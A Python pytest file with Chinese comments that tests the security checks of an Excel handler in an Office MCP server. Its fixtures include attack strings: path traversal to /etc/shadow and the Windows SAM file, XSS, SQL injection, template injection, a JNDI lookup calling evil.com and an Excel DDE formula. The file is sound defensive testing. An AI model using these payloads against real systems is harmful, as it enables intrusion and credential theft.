"""安全性测试"""
import pytest
import os
import tempfile
from unittest.mock import patch, Mock

from src.office_mcp_server.config import config
from src.office_mcp_server.handlers.excel_handler import ExcelHandler


class TestSecurity:
    """安全性测试"""

    def test_api_key_protection(self):
        """测试API密钥保护"""
        # 测试配置中的API密钥不应该明文存储
        api_key = getattr(config.api, 'key', None)

        if api_key:
            # API密钥不应该是明文
            assert not api_key.startswith('sk-'), "API密钥不应该明文存储"
            assert len(api_key) > 10, "API密钥长度不足"

    def test_file_path_validation(self):
        """测试文件路径验证"""
        handler = ExcelHandler()

        # 测试路径遍历攻击
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM",
            "file:///etc/passwd",
            "\\\\server\\share\\file.xlsx"
        ]

        for path in malicious_paths:
            with pytest.raises((ValueError, FileNotFoundError, PermissionError)):
                handler._validate_file_path(path)

    def test_input_sanitization(self):
        """测试输入清理"""
        handler = ExcelHandler()

        # 测试恶意输入
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "{{7*7}}",  # 模板注入
            "${jndi:ldap://evil.com/a}",  # JNDI注入
            "=cmd|'/c calc'!A1",  # Excel公式注入
        ]

        for malicious_input in malicious_inputs:
            sanitized = handler._sanitize_input(malicious_input)

            # 确保恶意内容被清理
            assert "<script>" not in sanitized
            assert "DROP TABLE" not in sanitized.upper()
            assert "{{" not in sanitized
            assert "${" not in sanitized
            assert not sanitized.startswith("=cmd")

    def test_file_size_limits(self):
        """测试文件大小限制"""
        handler = ExcelHandler()

        # 创建一个大文件用于测试
        with tempfile.NamedTemporaryFile(suffix='.xlsx', delete=False) as tmp_file:
            # 写入大量数据模拟大文件
            large_data = b'x' * (100 * 1024 * 1024)  # 100MB
            tmp_file.write(large_data)
            tmp_file.flush()

            # 测试文件大小检查
            with pytest.raises(ValueError, match="文件过大"):
                handler._check_file_size(tmp_file.name, max_size=50 * 1024 * 1024)

        # 清理临时文件
        os.unlink(tmp_file.name)

    def test_permission_checks(self):
        """测试权限检查"""
        handler = ExcelHandler()

        # 测试只读文件
        with tempfile.NamedTemporaryFile(suffix='.xlsx', delete=False) as tmp_file:
            tmp_file.write(b'test data')
            tmp_file.flush()

            # 设置为只读
            os.chmod(tmp_file.name, 0o444)

            # 测试写入权限检查
            with pytest.raises(PermissionError):
                handler._check_write_permission(tmp_file.name)

        # 清理临时文件
        os.chmod(tmp_file.name, 0o666)
        os.unlink(tmp_file.name)

    def test_data_privacy(self):
        """测试数据隐私保护"""
        handler = ExcelHandler()

        # 敏感数据模式
        sensitive_patterns = [
            "123-45-6789",  # SSN
            "4111-1111-1111-1111",  # 信用卡号
            "user@example.com",  # 邮箱
            "192.168.1.1",  # IP地址
        ]

        for pattern in sensitive_patterns:
            # 测试敏感数据检测
            is_sensitive = handler._detect_sensitive_data(pattern)
            assert is_sensitive, f"未检测到敏感数据: {pattern}"

            # 测试数据脱敏
            masked = handler._mask_sensitive_data(pattern)
            assert masked != pattern, f"敏感数据未被脱敏: {pattern}"
            assert "*" in masked or "X" in masked, f"脱敏格式不正确: {masked}"

    def test_logging_security(self):
        """测试日志安全"""
        import logging
        from io import StringIO

        # 创建测试日志处理器
        log_stream = StringIO()
        handler = logging.StreamHandler(log_stream)
        logger = logging.getLogger('test_security')
        logger.addHandler(handler)
        logger.setLevel(logging.INFO)

        # 测试敏感信息不会被记录
        sensitive_data = {
            'api_key': 'sk-1234567890abcdef',
            'password': 'secret123',
            'token': 'bearer_token_xyz'
        }

        excel_handler = ExcelHandler()
        excel_handler._log_operation('test_operation', sensitive_data)

        log_content = log_stream.getvalue()

        # 确保敏感信息被脱敏
        assert 'sk-1234567890abcdef' not in log_content
        assert 'secret123' not in log_content
        assert 'bearer_token_xyz' not in log_content
        assert '***' in log_content or '[REDACTED]' in log_content

    def test_error_message_security(self):
        """测试错误消息安全"""
        handler = ExcelHandler()

        # 模拟内部错误
        try:
            raise Exception("Internal error: database connection failed at server 192.168.1.100:5432")
        except Exception as e:
            safe_error = handler._sanitize_error_message(str(e))

            # 确保内部信息不会泄露
            assert "192.168.1.100" not in safe_error
            assert "5432" not in safe_error
            assert "database connection" not in safe_error

    def test_temporary_file_cleanup(self):
        """测试临时文件清理"""
        handler = ExcelHandler()

        # 创建临时文件
        temp_files = []
        for i in range(5):
            temp_file = handler._create_temp_file(f'test_data_{i}')
            temp_files.append(temp_file)
            assert os.path.exists(temp_file), f"临时文件未创建: {temp_file}"

        # 清理临时文件
        handler._cleanup_temp_files()

        # 验证文件已被删除
        for temp_file in temp_files:
            assert not os.path.exists(temp_file), f"临时文件未清理: {temp_file}"

    def test_resource_limits(self):
        """测试资源限制"""
        handler = ExcelHandler()

        # 测试内存限制
        large_data = [['x' * 1000] * 1000 for _ in range(1000)]  # 大数据集

        with pytest.raises(MemoryError):
            handler._check_memory_usage(large_data, max_memory=10 * 1024 * 1024)  # 10MB限制

        # 测试处理时间限制
        import time

        def slow_operation():
            time.sleep(10)  # 模拟慢操作

        with pytest.raises(TimeoutError):
            handler._execute_with_timeout(slow_operation, timeout=5)

    def test_configuration_security(self):
        """测试配置安全"""
        # 检查调试模式
        assert not getattr(config.server, 'debug', True), "生产环境不应启用调试模式"

        # 检查日志级别
        log_level = getattr(config.server, 'log_level', 'INFO')
        assert log_level not in ['DEBUG', 'TRACE'], f"生产环境日志级别过低: {log_level}"

        # 检查CORS设置
        cors_origins = getattr(config.server, 'cors_origins', [])
        assert '*' not in cors_origins, "CORS不应允许所有来源"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])